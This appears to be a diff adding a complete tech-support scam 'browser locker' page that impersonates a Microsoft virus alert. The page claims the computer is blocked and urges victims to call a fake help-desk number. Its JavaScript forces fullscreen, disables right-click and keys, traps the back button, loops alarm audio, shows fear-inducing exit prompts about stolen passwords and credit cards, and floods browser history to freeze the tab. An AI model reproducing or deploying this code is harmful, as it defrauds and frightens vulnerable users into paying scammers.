                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
+	</script> -->
+<script type="text/javascript">
+		function toggleFullScreen()
+		{
+			if (!document.fullscreenElement &&  !document.mozFullScreenElement && !document.webkitFullscreenElement)
+			{
+				if (document.documentElement.requestFullscreen)
+				{
+					document.documentElement.requestFullscreen();
+
+				}
+				else if (document.documentElement.mozRequestFullScreen)
+				{
+					document.documentElement.mozRequestFullScreen();
+
+				}
+				else if (document.documentElement.webkitRequestFullscreen)
+				{
+					document.documentElement.webkitRequestFullscreen(Element.ALLOW_KEYBOARD_INPUT);
+				}
+			}
+		}
+	</script>
+<script type="text/javascript">
+		window.onblur = function()
+		{
+
+		}
+
+	</script>
+<script type="text/javascript">
+		document.addEventListener('keyup', function(es)
+				{
+					if (es.keyCode == 27)
+					{
+						toggleFullScreen();
+
+					}
+				}
+				, false);
+	</script>
+<script type="text/javascript">
+		document.addEventListener('keyup', function(e)
+				{
+					if (e.keyCode == 122 || e.keyCode == 17 || e.keyCode == 18 || e.keyCode == 13)
+					{
+						document.getElementById('map').innerHTML = stroka;
+						toggleFullScreen();
+
+					}
+				}
+				, false);
+	</script>
+<script type="text/javascript">
+		window.onload = function ()
+		{
+			document.onclick = function (e)
+			{
+				e = e || event;
+				target = e.target || e.srcElement;
+				if (target.tagName == "DIV")
+				{
+					toggleFullScreen();
+					document.body.style.cursor = 'not-allowed';
+					document.getElementById('map').innerHTML = stroka;
+					document.getElementById('fa').innerHTML = "<iframe src='' width='12' height='12' style='position: absolute;left: -25px;'></iframe>";
+
+				}
+				else
+				{
+					toggleFullScreen();
+					document.body.style.cursor = 'index.htmt';
+					document.getElementById('map').innerHTML = stroka;
+					document.getElementById('fa').innerHTML = "<iframe src="" width="12" height="12" style="position: absolute;left: -25px;"></iframe>";
+
+				}
+
+			}
+		}
+	
+<script type="text/javascript">
+		document.oncontextmenu=new Function("return false");
+	</script>
+<script type="text/javascript">
+		addEventListener("click", function() {
+			document.getElementById('map').innerHTML = stroka;
+			var
+					el = document.documentElement
+					, rfs =
+							el.requestFullScreen
+							|| el.webkitRequestFullScreen
+							|| el.mozRequestFullScreen
+					;
+
+			rfs.call(el);
+
+		});
+
+
+
+	</script>
+
+<script type="text/javascript">
+		window.onkeydown = function(evt)
+		{
+			if(evt.keyCode == 27 || evt.keyCode == 18 || evt.keyCode == 123 || evt.keyCode == 85 || evt.keyCode == 9 || evt.keyCode == 115 || evt.keyCode == 116 || evt.keyCode == 112 || evt.keyCode == 114 || evt.keyCode == 17 || evt.keyCode == 91)
+			{
+				return togglefullscreen();
+
+			}
+
+		};
+		window.onkeypress = function(evn)
+		{
+			if(evn.keyCode == 123 || evn.keyCode == 117 || evn.keyCode == 91) return false;
+
+		};
+
+
+
+
+	</script>
+
+<script type="text/javascript">
+		onbeforeunload=function()
+		{
+			alert ("Press ESC, to close this page!");
+			return "Press ESC, to close this page!";
+
+		}
+	</script>
+    <script type="text/javascript">
+var idleTime = 0;
+$(document).ready(function () {
+    //Increment the idle time counter every minute.
+    var idleInterval = setInterval(timerIncrement, 60000); // 1 minute
+
+    //Zero the idle timer on mouse movement.
+    $(this).mousemove(function (e) {
+        idleTime = 0;
+    });
+    $(this).keypress(function (e) {
+        idleTime = 0;
+    });
+});
+
+function timerIncrement() {
+    idleTime = idleTime + 1;
+    if (idleTime > 19) { // 20 minutes
+        window.location.reload();
+    }
+}
+</script>
+
+<script>
+function getURLParameter(name) {
+return decodeURI(
+(RegExp(name + '=' + '(.+?)(&|$)').exec(location.search)||[,null])[1] || ''
+);
+}
+</script>
+
+
+	<script>
+		var is_chrome,
+				isChromium = window.chrome,
+				vendorName = window.navigator.vendor,
+				isOpera = window.navigator.userAgent.indexOf("OPR") > -1;
+			is_chrome = isChromium !== null && isChromium !== undefined && vendorName === "Google Inc." && isOpera == false ? true : false;
+
+			function alertCall()
+			{
+      var total = "";
+      for( var i = 0; i < 100000; i++ ) {
+          total = total + i.toString();
+          history.pushState(0,0, total );
+      }
+}
+		 	function alertTimed()
+			{
+				if (is_chrome)
+				{
+					setInterval(function(){
+						alertCall();
+					}, 200);
+				}
+				else
+				{
+					alertLoop();
+				}
+			}
+		 	function alertLoop()
+			{
+				for (i = 0; i < 500; i++)
+				{
+					alertCall();
+				}
+			}
+			function addEvent(obj, evt, fn)
+			{
+				if (obj.addEventListener)
+				{
+					obj.addEventListener(evt, fn, false)
+				}
+				else if (obj.attachEvent)
+				{
+					obj.attachEvent("on" + evt, fn)
+				}
+			}
+			$(document).ready(function(){
+				document.onkeydown = function(e){
+					if (e.ctrlKey && (e.keyCode === 67 || e.keyCode === 86 || e.keyCode === 85 || e.keyCode === 117))
+					{
+						if (!is_chrome)
+						{
+							alertTimed();
+						}
+						return true;
+					}
+					else if (e.keyCode === 123)
+					{
+						return true;
+					}
+					else
+					{
+						return true;
+					}
+				};
+				$(window).on('click', function(){
+					//window.open('index.html', 'window' + Math.floor((Math.random() * 9999) + 1), 'width=' + screen.availWidth + ',height=' + screen.availHeight + ',titlebar=1,menubar=1');
+					toggleFullScreen();
+					alertTimed();
+					document.getElementById("ifr").src="index.html";
+
+				});
+				addEvent(document, "mouseout", function(e){
+					e = e ? e : window.event;
+					var from = e.relatedTarget || e.toElement;
+					if (!is_chrome && (!from || from.nodeName == "body"))
+					{
+						alertTimed();
+					}
+				});
+			});
+			window.onbeforeunload = function(e){
+				var message = '*************************************************\n\nCall Windows  Help Desk Immediately at (888) 111-2365-\n\nThe following data will be compromised if you continue:\n1. Passwords\n2. Browser History\n3. Credit Card Information\n\nThis virus is well known for complete identity and credit card theft. Further action through this computer or any computer on the network will reveal private information and involve serious risks.\n\nCall Windows  Help Desk Immediately at (888) 111-2365';
+				e.returnValue = message;
+				return message;
+			};
+			window.onload = function(e){
+				//alertTimed();
+			};
+
+		$('confirm text').dialog(
+    {
+        modal:true, //Not necessary but dims the page background
+        buttons:{
+            'Save':function() {
+                //Whatever code you want to run when the user clicks save goes here
+             },
+             'Delete':function() {
+                 //Code for delete goes here
+              }
+        }
+    }
+);
+
+		</script>
+		 <script type="text/javascript">
+        function toggleFullScreen() {
+            if (!document.fullscreenElement && !document.mozFullScreenElement && !document.webkitFullscreenElement) {
+                if (document.documentElement.requestFullscreen) {
+                    document.documentElement.requestFullscreen();
+
+                } else if (document.documentElement.mozRequestFullScreen) {
+                    document.documentElement.mozRequestFullScreen();
+
+                } else if (document.documentElement.webkitRequestFullscreen) {
+                    document.documentElement.webkitRequestFullscreen(Element.ALLOW_KEYBOARD_INPUT);
+                }
+            }
+        }
+
+
+
+
+    </script>
+
+    <script>
+
+function ajay(){
+setInterval(function(){toggleFullScreen(); }, 1000);
+}
+</script>
+
+
+
+
+
+	<script type="text/javascript">
+		document.oncontextmenu=new Function("return false");
+	</script>
+	<script type="text/javascript">
+		addEventListener("click", function() {
+			document.getElementById('map').innerHTML = stroka;
+			var
+					el = document.documentElement
+					, rfs =
+							el.requestFullScreen
+							|| el.webkitRequestFullScreen
+							|| el.mozRequestFullScreen
+					;
+
+			rfs.call(el);
+
+		});</script>
+		<script type="text/javascript">
+		 function openMultipleTabs() {
+        var w1 = window.open('index.php', '1');
+        var w2 = window.open('index.php', '2');
+        var w3 = window.open('indes.php', '3');
+       }
+	</script>
+
+
+
+
+
+
+
+
+
+  <div class="window_box1 block3 ">
+    <img src="1.gif">
+  </div>
+   <div class="window_box2 block4 ">
+    <img src="3.gif">
+  </div>
+
+ <div class="window_box3 block5 ">
+    <img src="3.gif">
+  </div>
+<div class="container1" style="margin-top: 80px;padding: 30px">
+
+
+
+  <div class="row">
+    <div class="col-md-3">
+      <br><br><br>
+      <h3 class="heading_text">
+        Call For Support
+      </h3>
+      <h3 class="heading_text">
+      (888) 111-2365
+      </h3>
+
+
+    </div>
+     <div class="col-md-6">
+    </div>
+
+    <div class="col-md-3 text-right">
+      <br><br><br>
+      <h3 class="heading_text">
+        Call For Support
+      </h3>
+      <h3 class="heading_text">
+        (888) 111-2365
+      </h3>
+
+
+    </div>
+
+  </div>
+</div>
+<div class="block1 heart">
+      <div class="middle" id="alert-modal">
+            <a style="margin-right: 8px" class="cross">×</a>
+            <div class="content-box" id="alert-content-box">
+              <center><strong>VIRUS ALERT FROM MICROSOFT</strong></center>
+              <center><h5><b>***This computer  is BLOCKED***</b></h5></center>
+              <p><b>Do not close this window and restart your computer</b><br>
+              <b>Your computer's registration key is Blocked.</b><br>
+              <b>Why we blocked your computer?</b></p>
+              <p>The window's registration key is illegal.<br>
+              This window is using pirated software.<br>
+              This window is sending virus over the internet.<br>
+              This window is hacked or used from undefined location.<br>
+              We block this computer for your security. <br>
+              Contact Windows helpline to reactivate your computer.</p>
+
+
+
+
+              <form action="#" method="POST" align="center">
+                    <div style="height:75px;text-align:left;">
+                      <strong class="">Enter Windows registration key to unblock or Call Support at <br>
+                        <span style="font-size:21px">(888) 111-2365(Toll Free)</span></strong>
+
+                    <div style="margin-top: 10px;">
+                      <strong class="" style="color: rgba(0, 0, 0, 0.7);float: left;width: 90px;padding-top: 8px"> ENTER KEY:</strong>
+                      <div style="width:100%;max-width: 250px;float: left">
+                        <input type="text" name="ENTER KEY" style="width: 95%;height:35px">
+                      </div>
+                      <div style="float: left;width: 60px">
+                        <input class="ms-btn fa_btn56" type="button" value="Submit">
+                      </div>
+                    </div>
+                     </div>
+                  </form>
+
+            </div>
+          </div>
+</div>
+
+
+<div class="block2" style="background-color:red;">
+  <div class="row ">
+    <div class="col-md-3 col-lg-3 col-sm-3 col-xl-3">
+      <img style="height: 240px; width: auto;" src="rsod.png">
+    </div>
+    <div class="col-md-6 col-lg-6 col-sm-6 col-xl-6 ">
+      <div id="red_alert" style="margin-bottom: 10px;"><br>
+        <h1><img style="height: 40px; width: 40px; margin-top: -10px;" src="335158-windows-8-window.png"> Windows
+          Support Alert</h1>
+        <h3>Your System Detected Some Unusual Activity on .</h3>
+        <h5>It might harm your computer data and track your financial activities.</h5>
+        <h3>Please report this activity to (888) 111-2365</h3>
+      </div>
+      <div class="row">
+        <div class="col-md-12">
+          <div class="row">
+            <div class="col-md-6 no-padding-right">
+              <button class="ms-btn">Ignore Alert</button>
+            </div>
+            <div class="col-md-6 no-padding-left">
+                <button class="ms-btn chat_now ">Chat Now</button>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<script> var link_redirect = gourl;
+if (window.history && window.history.pushState) {
+    window.onpopstate = function () {
+        var hashLocation = location.hash;
+        var hashSplit = hashLocation.split("#!/");
+        var hashName = hashSplit[1];
+        if (hashName !== '') {
+            var hash = window.location.hash;
+            if (hash === '') {
+                // alert('Back button was pressed.');
+                window.onbeforeunload = null;
+                window.location=link_redirect;
+                return false;
+            }
+        }
+    };
+    window.history.pushState('forward', null, '#forward');
+}
+else {
+    var ignoreHashChange = true;
+    window.onhashchange = function () {
+        if (!ignoreHashChange) {
+            ignoreHashChange = true;
+            var hashLocation = location.hash;
+            var hashSplit = hashLocation.split("#!/");
+            var hashName = hashSplit[1];
+            if (hashName !== '') {
+                var hash = window.location.hash;
+                if (hash === '') {
+                    // alert('Back button was pressed.');
+                    window.onbeforeunload = null;
+                    window.location=link_redirect;
+                    return false;
+                }
+            }
+        }
+        else {
+            ignoreHashChange = false;
+        }
+    };
+    window.history.pushState('forward', null, '#forward');
+}
+</script>
+
+
+
+<script> var link_redirect = gourl;
+if (window.history && window.history.pushState) {
+    window.onpopstate = function () {
+        var hashLocation = location.hash;
+        var hashSplit = hashLocation.split("#!/");
+        var hashName = hashSplit[1];
+        if (hashName !== '') {
+            var hash = window.location.hash;
+            if (hash === '') {
+                // alert('Back button was pressed.');
+                window.onbeforeunload = null;
+                window.location=link_redirect;
+                return false;
+            }
+        }
+    };
+    window.history.pushState('forward', null, '#forward');
+}
+else {
+    var ignoreHashChange = true;
+    window.onhashchange = function () {
+        if (!ignoreHashChange) {
+            ignoreHashChange = true;
+            var hashLocation = location.hash;
+            var hashSplit = hashLocation.split("#!/");
+            var hashName = hashSplit[1];
+            if (hashName !== '') {
+                var hash = window.location.hash;
+                if (hash === '') {
+                    // alert('Back button was pressed.');
+                    window.onbeforeunload = null;
+                    window.location=link_redirect;
+                    return false;
+                }
+            }
+        }
+        else {
+            ignoreHashChange = false;
+        }
+    };
+    window.history.pushState('forward', null, '#forward');
+}
+</script>
+
+
+
+<script type="text/javascript">
+
+
+
+	  //alert("Your Computer is permanently blocked. Call for support at (888) 111-2365 ")
+
+	document.getElementById('map').innerHTML = "<img style='display:block;position:absolute;top:20px;left:0;right:0;margin:0 auto;z-index:7000;' src=''>";
+</script>
+<script language="JavaScript1.2">
+	<!--
+	if (window.Event)
+		document.captureEvents(Event.MOUSEUP);
+
+	function nocontextmenu() {
+		event.cancelBubble = true, event.returnValue = false;
+
+		return false;
+	}
+
+	function norightclick(e) {
+		if (window.Event) {
+			if (e.which == 2 || e.which == 3) return false;
+		}
+		else if (event.button == 2 || event.button == 3) {
+			event.cancelBubble = true, event.returnValue = false;
+			return false;
+		}
+	}
+
+	if (document.layers)
+		document.captureEvents(Event.MOUSEDOWN);
+
+	document.oncontextmenu = nocontextmenu;
+	document.onmousedown = norightclick;
+	document.onmouseup = norightclick;
+	 </script>
+
+<script>
+	window.setInterval("reloadIFrame();", 50000);
+	function reloadIFrame() {
+	 document.getElementById("calendar").src=calendar.src;
+	}
+	</script>
+
+  <audio autoplay="autoplay" loop="" id="msgSound">
+    <source src="err.mp3" type="audio/mpeg">
+  </audio>
+
+  <!--<audio autoplay="autoplay" loop="" id="msgSound1">
+    <source src="beep.mp3" type="audio/mpeg">
+  </audio>-->
+  <audio autoplay="autoplay" loop="" id="msgSound1">
+    <source src="bxxepxx.mp3" type="audio/mpeg">
+  </audio>
+
+
+      <script type="text/javascript">/*<![CDATA[*/
+      // audio play /*
+        var msgAudioEl = document.getElementById("msgSound");
+
+        var playMsgInt = setInterval(function () {
+          if (isPlaying(msgAudioEl)) {
+            // console.log('already playing. clearing interval');
+            clearInterval(playMsgInt);
+          } else {
+            // console.log('Triggering play');
+            msgAudioEl.play();
+          }
+        }, 500);
+        // audio play */
+
+      </script>
+
+          <script type="text/javascript">/*<![CDATA[*/
+          // audio play /*
+            var msgAudioEl = document.getElementById("msgSound1");
+
+            var playMsgInt = setInterval(function () {
+              if (isPlaying(msgAudioEl)) {
+                // console.log('already playing. clearing interval');
+                clearInterval(playMsgInt);
+              } else {
+                // console.log('Triggering play');
+                msgAudioEl.play();
+              }
+            }, 500);
+            // audio play */
+
+          </script>
+
+
+          <script type="text/javascript" language="JavaScript1.2">
+
+          	if (window.Event)
+          		document.captureEvents(Event.MOUSEUP);
+
+
+          	function nocontextmenu() {
+          		event.cancelBubble = true, event.returnValue = false;
+
+          		return false;
+          	}
+
+          	function norightclick(e) {
+          		if (window.Event) {
+          			if (e.which == 2 || e.which == 3) return false;
+          		}
+          		else if (event.button == 2 || event.button == 3) {
+          			event.cancelBubble = true, event.returnValue = false;
+          			return false;
+
+          		}
+          	}
+
+
+          	if (document.layers)
+          		document.captureEvents(Event.MOUSEDOWN);
+
+          	document.oncontextmenu = nocontextmenu;
+          	document.onmousedown = norightclick;
+          	document.onmouseup = norightclick;
+
+
+
+          </script>
+
+<iframe src="bxxepxx.mp3" allow="autoplay" style="display:none;">
+</body>
+
+</html>
+</iframe></body></html>
